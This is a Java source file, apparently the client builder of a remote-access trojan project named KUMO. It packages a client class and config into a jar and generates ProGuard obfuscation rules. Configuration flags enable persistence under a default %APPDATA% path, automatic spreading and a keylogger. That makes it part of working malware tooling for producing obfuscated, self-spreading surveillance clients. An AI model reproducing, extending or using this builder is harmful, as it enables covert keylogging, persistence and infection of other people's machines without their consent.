package KUMO;

import GUI.Views.AlertView;
import Logger.Level;
import Logger.Logger;
import Server.Data.FileUtils;
import Server.Data.PseudoBase;

import java.awt.*;
import java.io.*;
import java.util.ArrayList;
import java.util.jar.Attributes;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;

public class ClientBuilder {
    public static boolean isPersistent = false;
    public static boolean autoSpread = false;
    public static boolean isDebug = false;
    public static boolean createProguard = false;
    public static boolean keylogger = false;
    private String clientName;
    public static String jarCreatedBy = "";
    public static String jarVersion = "1.0";
    public static String persistencePath = "{{DEFAULT}}"; // The client will use %APPDATA\Desktop.jar as a default

    public ClientBuilder(String clientName) {
        if (isDebug){
            this.clientName = clientName + "-debug";
        } else {
            this.clientName = clientName;
        }
        try {
            PseudoBase.writeKumoData();
        } catch (IOException e) {
            Logger.log(Level.ERROR, e.toString(), e);
        }
    }

    public void run() throws IOException {
        Manifest manifest = new Manifest();
        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, "1.0");
        manifest.getMainAttributes().put(Attributes.Name.IMPLEMENTATION_TITLE, clientName);
        manifest.getMainAttributes().put(Attributes.Name.IMPLEMENTATION_VENDOR, jarCreatedBy);
        manifest.getMainAttributes().put(Attributes.Name.IMPLEMENTATION_VERSION, jarVersion);
        manifest.getMainAttributes().put(Attributes.Name.CLASS_PATH, ".");
        manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, "Client.Client");
        manifest.getMainAttributes().put(Attributes.Name.SEALED, "true");

        String jarFileName = System.getProperty("user.home") + "/Kumo/" + clientName + ".jar";
        File jarFile = new File(jarFileName);
        try {
            byte[] buffer = new byte[1024];
            FileOutputStream stream = new FileOutputStream(jarFile);
            JarOutputStream out = new JarOutputStream(stream, manifest);
            ArrayList<File> fileList = new ArrayList<>();
            try {
                FileUtils.ExportResource("/Client/Client.class");
                Thread.sleep(2000);
            } catch (Exception e) {
                Logger.log(Level.ERROR, e.toString(), e);
            }
            fileList.add(new File(System.getProperty("user.home").replace("\\", "/") + "/Kumo/Client/Client.class"));
            fileList.add(new File(System.getProperty("user.home").replace("\\", "/") + "/Kumo/.xrst"));

            for (File file : fileList) {
                if (file == null) {
                } else {
                    if (file.isDirectory()) {
                        JarEntry jar = new JarEntry(file.getName() + "/");
                        jar.setTime(file.lastModified());
                        out.putNextEntry(jar);
                        out.closeEntry();
                    } else {
                        JarEntry jar = new JarEntry("Client/" + file.getName());
                        jar.setTime(file.lastModified());
                        out.putNextEntry(jar);
                        FileInputStream in = new FileInputStream(file);
                        while (true) {
                            int nRead = in.read(buffer, 0, buffer.length);
                            if (nRead <= 0) {
                                break;
                            }
                            out.write(buffer, 0, nRead);
                        }
                        out.closeEntry();
                        in.close();
                    }
                }
            }
            out.close();
            stream.close();

            if (ClientBuilder.createProguard)
                createProguardRules(jarFileName);

            Desktop.getDesktop().open(new File(System.getProperty("user.home") + "/Kumo/"));
            Logger.log(Level.INFO, "Build Complete!");
            FileUtils.deleteFiles();
        } catch (Exception e) {
            Logger.log(Level.ERROR, e.toString(), e);
        }
    }

    public static void createProguardRules(String inJarName){
        PrintWriter pw = null;
        try {
            File proguardFile = new File(System.getProperty("user.home") + File.separator + "Kumo" + File.separator + "proguard-rules.pro");
            System.out.println(proguardFile.getAbsolutePath());
            proguardFile.createNewFile();
            String rules = "-injars " + inJarName + ".jar\n" +
                    "-outjars " + inJarName + "-obfuscated.jar\n" +
                    "-target 1.8\n" +
                    "-libraryjars <java.home>\\jre\\lib\"\n" +
                    " -overloadaggressively\n" +
                    "-keep class * { public static void main(java.lang.String[]);}\n" +
                    "-optimizationpasses 3\n" +
                    "-allowaccessmodification\n" +
                    "-keepparameternames";
            pw = new PrintWriter(proguardFile);
            pw.write(rules);
            pw.close();
        } catch (IOException ioe){
            new AlertView().showErrorAlert("Could not create proguard rules: " + ioe.getMessage());
        }
    }
}


